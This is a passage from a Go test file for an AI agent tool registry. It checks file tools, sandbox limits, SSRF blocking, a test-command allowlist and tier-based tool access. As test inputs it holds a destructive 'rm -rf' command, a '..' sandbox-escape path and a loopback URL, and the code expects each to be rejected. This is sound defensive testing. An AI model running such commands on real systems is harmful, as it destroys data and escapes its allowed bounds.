		t.Parallel()
		call := makeToolCall("list_directory", map[string]any{
			"path":         tmpDir,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "[dir]")
		assertContains(t, result.Content, "subdir")
		assertContains(t, result.Content, "[file]")
		assertContains(t, result.Content, "readme.txt")
	})

	t.Run("non-existent directory returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("list_directory", map[string]any{
			"path":         filepath.Join(tmpDir, "ghost"),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error listing non-existent directory, got none")
		}
		assertContains(t, result.Error, "failed to read directory")
	})
}

// TestPatchFileHandler verifies successful replacement, not-found failure,
// and ambiguous-match failure.
func TestPatchFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("patches file successfully", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(tmpDir, "patch_success.go")
		mustWriteFile(t, filePath, "package main\n\nfunc hello() {}\n")
		call := makeToolCall("patch_file", map[string]any{
			"path":         filePath,
			"old_text":     "func hello() {}",
			"new_text":     "func hello() { return }",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "patched")
		content, err := os.ReadFile(filePath)
		if err != nil {
			t.Fatalf("read back: %v", err)
		}
		assertContains(t, string(content), "func hello() { return }")
	})

	t.Run("fails when old_text not found", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(tmpDir, "patch_notfound.go")
		mustWriteFile(t, filePath, "package main\n")
		call := makeToolCall("patch_file", map[string]any{
			"path":         filePath,
			"old_text":     "func missing() {}",
			"new_text":     "func replaced() {}",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error when old_text not found, got none")
		}
		assertContains(t, result.Error, "not found")
	})

	t.Run("fails when old_text is ambiguous", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(tmpDir, "patch_ambiguous.go")
		mustWriteFile(t, filePath, "foo\nfoo\n")
		call := makeToolCall("patch_file", map[string]any{
			"path":         filePath,
			"old_text":     "foo",
			"new_text":     "bar",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for ambiguous old_text, got none")
		}
		assertContains(t, result.Error, "ambiguous")
	})
}

// TestSearchTextCancelled verifies that a pre-cancelled context causes search_text
// to return a cancellation error before doing any file I/O.
func TestSearchTextCancelled(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "data.txt"), "some content to search")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	call := makeToolCall("search_text", map[string]any{
		"pattern":      "content",
		"path":         filepath.Join(tmpDir, "data.txt"),
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(ctx, call, quest, agent)
	if result.Error == "" {
		t.Fatal("expected cancellation error, got none")
	}
	assertContains(t, result.Error, "cancel")
}

// TestRunTestsHandler verifies that an allowed but nonexistent package returns
// a command-failed error (not a metacharacter or prefix-rejection error), and
// that a rejected command prefix is refused.
func TestRunTestsHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierExpert,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen:    {Level: domain.ProficiencyNovice},
			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("allowed prefix with nonexistent package runs shell and fails", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("run_tests", map[string]any{
			// This is an allowed prefix but ./nonexistent will not be found.
			// The command passes prefix+metacharacter checks and reaches runShellCommand.
			"command":      "go test ./nonexistent",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		// We expect an error because the package doesn't exist, but it must NOT
		// be the "shell metacharacters" or "only allows test commands" rejection.
		if strings.Contains(result.Error, "shell metacharacters") {
			t.Fatalf("command was incorrectly rejected for metacharacters: %s", result.Error)
		}
		if strings.Contains(result.Error, "only allows test commands") {
			t.Fatalf("command was incorrectly rejected as disallowed prefix: %s", result.Error)
		}
		// The command should fail (no such package) — verify we got some output or error.
		if result.Error == "" && result.Content == "" {
			t.Fatal("expected error or output from failed go test command, got neither")
		}
	})

	t.Run("rejected command prefix is refused", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("run_tests", map[string]any{
			"command":      "rm -rf /tmp/something",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected rejection of disallowed command prefix, got none")
		}
		assertContains(t, result.Error, "only allows test commands")
	})
}

// =============================================================================
// writeFileHandler tests
// =============================================================================

// TestWriteFileHandler verifies that write_file creates files, creates parent
// directories when missing, enforces the 1 MB size limit, and rejects sandbox
// escape attempts.
func TestWriteFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	// Resolve symlinks so validatePath sees the same canonical path on macOS.
	realTmpDir, err := filepath.EvalSymlinks(tmpDir)
	if err != nil {
		t.Fatalf("EvalSymlinks: %v", err)
	}
	reg := NewToolRegistryWithSandbox(realTmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierExpert,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("writes new file and verifies content", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(realTmpDir, "output.txt")
		call := makeToolCall("write_file", map[string]any{
			"path":         filePath,
			"content":      "hello semdragons",
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "Successfully wrote")

		got, readErr := os.ReadFile(filePath)
		if readErr != nil {
			t.Fatalf("read back: %v", readErr)
		}
		if string(got) != "hello semdragons" {
			t.Errorf("file content = %q, want %q", string(got), "hello semdragons")
		}
	})

	t.Run("creates parent directories when missing", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(realTmpDir, "nested", "deep", "file.txt")
		call := makeToolCall("write_file", map[string]any{
			"path":         filePath,
			"content":      "nested content",
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		if _, statErr := os.Stat(filePath); statErr != nil {
			t.Errorf("expected file at %s after write_file: %v", filePath, statErr)
		}
	})

	t.Run("rejects content exceeding 1 MB", func(t *testing.T) {
		t.Parallel()
		// maxFileWriteSize = 1<<20 = 1048576 bytes; write one byte over.
		oversized := strings.Repeat("x", maxFileWriteSize+1)
		call := makeToolCall("write_file", map[string]any{
			"path":         filepath.Join(realTmpDir, "oversized.txt"),
			"content":      oversized,
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for oversized content, got none")
		}
		assertContains(t, result.Error, "too large")
	})

	t.Run("missing path argument returns error", func(t *testing.T) {
		t.Parallel()
		// path key present but not a string — handler checks .(string) ok.
		call := makeToolCall("write_file", map[string]any{
			"path":         42, // wrong type triggers !ok
			"content":      "data",
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for non-string path, got none")
		}
		assertContains(t, result.Error, "path argument must be a string")
	})

	t.Run("missing content argument returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("write_file", map[string]any{
			"path":         filepath.Join(realTmpDir, "out.txt"),
			"content":      123, // wrong type triggers !ok
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for non-string content, got none")
		}
		assertContains(t, result.Error, "content argument must be a string")
	})

	t.Run("sandbox escape rejected", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("write_file", map[string]any{
			"path":         filepath.Join(realTmpDir, "..", "escape.txt"),
			"content":      "bad",
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for sandbox-escaping path, got none")
		}
		assertContains(t, result.Error, "escapes sandbox")
	})
}

// =============================================================================
// httpRequestHandler tests
// =============================================================================

// TestHTTPRequestHandler verifies that http_request validates its arguments
// and enforces SSRF protection (blocking private/loopback addresses).
func TestHTTPRequestHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	// http_request requires TierJourneyman and no specific skill.
	agent := &agentprogression.Agent{Tier: domain.TierJourneyman}
	quest := &domain.Quest{}

	t.Run("empty url returns argument error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("http_request", map[string]any{
			"url":          "",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for empty url, got none")
		}
		assertContains(t, result.Error, "url argument is required")
	})

	t.Run("url without http prefix returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("http_request", map[string]any{
			"url":          "ftp://example.com",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for non-http url, got none")
		}
		assertContains(t, result.Error, "url must start with http://")
	})

	t.Run("invalid method returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("http_request", map[string]any{
			"url":          "https://example.com",
			"method":       "DELETE",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for DELETE method, got none")
		}
		assertContains(t, result.Error, "method must be GET or POST")
	})

	t.Run("localhost is blocked by SSRF protection", func(t *testing.T) {
		t.Parallel()
		// The custom httpToolClient transport blocks private and loopback addresses.
		// 127.0.0.1 is always a loopback address; even if a server were running
		// there the dial would be rejected before any connection is made.
		call := makeToolCall("http_request", map[string]any{
			"url":          "http://127.0.0.1:12345/",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected SSRF-rejection error for localhost, got none")
		}
		// The error should mention the request failing, not an argument error.
		assertNotContains(t, result.Error, "url argument is required")
		assertNotContains(t, result.Error, "method must be")
	})
}

// =============================================================================
// runCommandHandler tests
// =============================================================================

// TestRunCommandHandler verifies that run_command executes shell commands and
// returns output on success, and an error on failure.
func TestRunCommandHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierMaster}
	quest := &domain.Quest{}

	t.Run("successful echo command returns output", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("run_command", map[string]any{
			"command":      "echo hello",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "hello")
	})

	t.Run("failing command returns error with output", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("run_command", map[string]any{
			"command":      "exit 1",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for failing command, got none")
		}
		assertContains(t, result.Error, "command failed")
	})
}

// =============================================================================
// graphQueryHandler tests
// =============================================================================

// TestGraphQueryHandler verifies graph_query argument validation, entity type
// enforcement, limit capping, and successful query path via a mock queryFn.
func TestGraphQueryHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()

	// Apprentice tier is sufficient — graph_query has no skill requirement.
	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("valid query returns formatted results", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()
		reg.RegisterGraphQuery(func(_ context.Context, entityType string, limit int) (string, error) {
			return fmt.Sprintf("Found 1 %s(s) (limit=%d):\n\n--- test.entity ---\n{}", entityType, limit), nil
		})

		call := makeToolCall("graph_query", map[string]any{
			"entity_type":  "agent",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "agent")
	})

	t.Run("invalid entity_type returns error", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()
		reg.RegisterGraphQuery(func(_ context.Context, _ string, _ int) (string, error) {
			return "should not be called", nil
		})

		call := makeToolCall("graph_query", map[string]any{
			"entity_type":  "spaceship",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for invalid entity_type, got none")
		}
		assertContains(t, result.Error, "invalid entity_type")
	})

	t.Run("empty entity_type returns required error", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()
		reg.RegisterGraphQuery(func(_ context.Context, _ string, _ int) (string, error) {
			return "should not be called", nil
		})

		call := makeToolCall("graph_query", map[string]any{
			"entity_type":  "",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for empty entity_type, got none")
		}
		assertContains(t, result.Error, "entity_type argument is required")
	})

	t.Run("limit is capped at 100", func(t *testing.T) {
		t.Parallel()
		var capturedLimit int
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()
		reg.RegisterGraphQuery(func(_ context.Context, _ string, limit int) (string, error) {
			capturedLimit = limit
			return "ok", nil
		})

		call := makeToolCall("graph_query", map[string]any{
			"entity_type":  "quest",
			"limit":        float64(9999),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		if capturedLimit != 100 {
			t.Errorf("limit = %d, want 100 (capped)", capturedLimit)
		}
	})

	t.Run("custom limit within range is respected", func(t *testing.T) {
		t.Parallel()
		var capturedLimit int
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()
		reg.RegisterGraphQuery(func(_ context.Context, _ string, limit int) (string, error) {
			capturedLimit = limit
			return "ok", nil
		})

		call := makeToolCall("graph_query", map[string]any{
			"entity_type":  "guild",
			"limit":        float64(42),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		if capturedLimit != 42 {
			t.Errorf("limit = %d, want 42", capturedLimit)
		}
	})
}

// =============================================================================
// FormatEntitySummary tests
// =============================================================================

// TestFormatEntitySummary verifies that FormatEntitySummary returns an empty
// string for an empty slice and returns formatted text for a non-empty slice.
func TestFormatEntitySummary(t *testing.T) {
	t.Parallel()

	t.Run("empty slice returns empty string", func(t *testing.T) {
		t.Parallel()
		result := FormatEntitySummary([]graph.EntityState{}, "agent")
		if result != "" {
			t.Errorf("expected empty string for empty slice, got %q", result)
		}
	})

	t.Run("non-empty slice returns formatted output", func(t *testing.T) {
		t.Parallel()
		entities := []graph.EntityState{
			{
				ID: "c360.prod.game.board1.agent.dragon",
				Triples: []message.Triple{
					{
						Subject:   "c360.prod.game.board1.agent.dragon",
						Predicate: "agent.progression.level",
						Object:    float64(10),
					},
					{
						Subject:   "c360.prod.game.board1.agent.dragon",
						Predicate: "agent.identity.name",
						Object:    "Dragon",
					},
				},
			},
		}
		result := FormatEntitySummary(entities, "agent")
		assertContains(t, result, "c360.prod.game.board1.agent.dragon")
		assertContains(t, result, "agent.progression.level")
		assertContains(t, result, "agent.identity.name")
		assertContains(t, result, "Found 1 agent(s)")
	})
}

// =============================================================================
// GetToolsForQuest tests
// =============================================================================

// TestGetToolsForQuest verifies that GetToolsForQuest correctly filters tools
// by agent tier, agent skills, and quest AllowedTools list.
func TestGetToolsForQuest(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()

	t.Run("apprentice tier only sees apprentice tools", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()

		agent := &agentprogression.Agent{Tier: domain.TierApprentice}
		quest := &domain.Quest{}

		tools := reg.GetToolsForQuest(quest, agent)
		names := toolNames(tools)

		// Apprentice can read but not write.
		assertContainsStr(t, names, "read_file")
		assertContainsStr(t, names, "list_directory")
		assertNotContainsStr(t, names, "write_file") // TierExpert required
		assertNotContainsStr(t, names, "run_command") // TierMaster required
	})

	t.Run("master tier sees all tools (with required skills)", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()

		agent := &agentprogression.Agent{
			Tier: domain.TierMaster,
			SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
				domain.SkillCodeGen:    {Level: domain.ProficiencyNovice},
				domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
			},
		}
		quest := &domain.Quest{}

		tools := reg.GetToolsForQuest(quest, agent)
		names := toolNames(tools)

		assertContainsStr(t, names, "read_file")
		assertContainsStr(t, names, "write_file")
		assertContainsStr(t, names, "run_command")
		assertContainsStr(t, names, "run_tests")
	})

	t.Run("quest AllowedTools restricts available tools", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()

		agent := &agentprogression.Agent{Tier: domain.TierApprentice}
		quest := &domain.Quest{AllowedTools: []string{"read_file"}}

		tools := reg.GetToolsForQuest(quest, agent)
		names := toolNames(tools)

		assertContainsStr(t, names, "read_file")
		assertNotContainsStr(t, names, "list_directory") // not in AllowedTools
	})

	t.Run("agent without required skill cannot use skill-gated tool", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistryWithSandbox(tmpDir)
		reg.RegisterBuiltins()

		// Expert tier but no SkillCodeGen — write_file requires it.
		agent := &agentprogression.Agent{
			Tier:               domain.TierExpert,
			SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{},
		}
		quest := &domain.Quest{}

		tools := reg.GetToolsForQuest(quest, agent)
		names := toolNames(tools)

		assertNotContainsStr(t, names, "write_file")
	})
}

// =============================================================================
// SetSandboxDir / GetSandboxDir tests
// =============================================================================

// TestSandboxDirGetterSetter verifies that SetSandboxDir and GetSandboxDir
// round-trip correctly and that the registry starts with an empty sandbox.
func TestSandboxDirGetterSetter(t *testing.T) {
	t.Parallel()

	reg := NewToolRegistry()

	if got := reg.GetSandboxDir(); got != "" {
		t.Errorf("initial sandbox dir = %q, want empty string", got)
	}

	reg.SetSandboxDir("/tmp/mybox")
	if got := reg.GetSandboxDir(); got != "/tmp/mybox" {
		t.Errorf("after SetSandboxDir, got %q, want %q", got, "/tmp/mybox")
	}
}

// =============================================================================
// containsToolName tests
// =============================================================================

// TestContainsToolName verifies the containsToolName helper.
func TestContainsToolName(t *testing.T) {
	t.Parallel()

	allowed := []string{"read_file", "write_file", "run_tests"}

	if !containsToolName(allowed, "write_file") {
		t.Error("expected write_file to be found in allowed list")
	}
	if containsToolName(allowed, "delete_file") {
		t.Error("expected delete_file NOT to be found in allowed list")
	}
	if containsToolName([]string{}, "any") {
		t.Error("expected empty list to return false")
	}
}

// =============================================================================
// Helpers
// =============================================================================

// toolNames extracts the name strings from a slice of ToolDefinitions.
func toolNames(tools []agentic.ToolDefinition) []string {
	names := make([]string, len(tools))
	for i, td := range tools {
		names[i] = td.Name
	}
	return names
}

// assertContainsStr checks that a string slice contains the expected element.
func assertContainsStr(t *testing.T, slice []string, want string) {
	t.Helper()
	for _, s := range slice {
		if s == want {
			return
		}
	}
	t.Errorf("expected %q in %v", want, slice)
}

// assertNotContainsStr checks that a string slice does NOT contain the element.
func assertNotContainsStr(t *testing.T, slice []string, want string) {
	t.Helper()
	for _, s := range slice {
		if s == want {
			t.Errorf("expected %q NOT to be in %v", want, slice)
			return
		}
	}
}

// mustWriteFile creates intermediate directories and writes content to path.
func mustWriteFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatalf("mustWriteFile MkdirAll: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("mustWriteFile WriteFile: %v", err)
	}
}

// makeToolCall constructs a minimal agentic.ToolCall for testing handlers directly.
func makeToolCall(name string, args map[string]any) agentic.ToolCall {
	return agentic.ToolCall{
		ID:        "test-call-id",
		Name:      name,
		Arguments: args,
	}
}

func assertContains(t *testing.T, s, substr string) {
	t.Helper()
	if !strings.Contains(s, substr) {
		t.Errorf("expected %q to contain %q", s, substr)
	}
}

func assertNotContains(t *testing.T, s, substr string) {
	t.Helper()
	if strings.Contains(s, substr) {
		t.Errorf("expected %q NOT to contain %q", s, substr)
	}
}
